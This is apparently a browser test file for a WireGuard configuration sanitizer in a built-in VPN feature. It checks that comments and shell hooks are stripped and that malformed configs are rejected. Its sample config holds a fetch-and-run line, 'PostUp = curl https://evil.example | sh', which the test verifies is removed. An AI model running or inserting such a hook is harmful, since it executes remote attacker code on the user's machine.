/* Any copyright is dedicated to the Public Domain.
 * http://creativecommons.org/publicdomain/zero/1.0/ */

"use strict";

const { buildWireproxyConfig, sanitizeWireGuardConfig } =
  ChromeUtils.importESModule(
    "moz-src:///browser/components/freevpn/FreeVPNWireGuard.sys.mjs"
  );

// Keys are random test values in WireGuard's base64 format.
const PRIVATE_KEY = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
const PUBLIC_KEY = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

const PROTON_LIKE = `# Proton VPN example
[Interface]
# Key for test
PrivateKey = ${PRIVATE_KEY}
Address = 10.2.0.2/32
DNS = 10.2.0.1
PostUp = curl https://evil.example | sh

[Peer]
# NL-FREE#1
PublicKey = ${PUBLIC_KEY}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51820
PersistentKeepalive = 25
`;

add_task(function test_sanitize_valid() {
  const { config, endpoint } = sanitizeWireGuardConfig(PROTON_LIKE);
  Assert.equal(endpoint, "203.0.113.5:51820");
  Assert.ok(config.includes(`PrivateKey = ${PRIVATE_KEY}`));
  Assert.ok(config.includes("DNS = 10.2.0.1"));
  Assert.ok(config.includes("AllowedIPs = 0.0.0.0/0, ::/0"));
  Assert.ok(config.includes("PersistentKeepalive = 25"));
  Assert.ok(!/PostUp|curl/.test(config), "Shell hooks are dropped");
  Assert.ok(!config.includes("#"), "Comments are dropped");
  Assert.ok(config.startsWith("[Interface]\n"));
});

add_task(function test_sanitize_windows_line_endings() {
  const { endpoint } = sanitizeWireGuardConfig(
    PROTON_LIKE.replace(/\n/g, "\r\n")
  );
  Assert.equal(endpoint, "203.0.113.5:51820");
});

add_task(function test_sanitize_invalid() {
  const cases = {
    "no [Peer] section": PROTON_LIKE.split("[Peer]")[0],
    "expected one [Interface] section": PROTON_LIKE.replace(
      "[Peer]",
      "[Interface]\n[Peer]"
    ),
    "missing or invalid PrivateKey": PROTON_LIKE.replace(PRIVATE_KEY, "abc"),
    "missing or invalid PublicKey": PROTON_LIKE.replace(PUBLIC_KEY, "abc="),
    "missing or invalid Endpoint": PROTON_LIKE.replace(
      "Endpoint = 203.0.113.5:51820",
      "Endpoint = 203.0.113.5"
    ),
    "missing Address": PROTON_LIKE.replace("Address = 10.2.0.2/32", ""),
  };
  for (const [reason, text] of Object.entries(cases)) {
    Assert.throws(
      () => sanitizeWireGuardConfig(text),
      e => e.code == "wireguard-invalid" && e.detail == reason,
      reason
    );
  }
  Assert.throws(
    () => sanitizeWireGuardConfig("just text"),
    e => e.code == "wireguard-invalid"
  );
});

add_task(function test_buildWireproxyConfig() {
  Assert.equal(
    buildWireproxyConfig("C:\\Users\\a b\\wireguard.conf", 41234),
    "WGConfig = C:\\Users\\a b\\wireguard.conf\n\n[Socks5]\nBindAddress = 127.0.0.1:41234\n"
  );
});
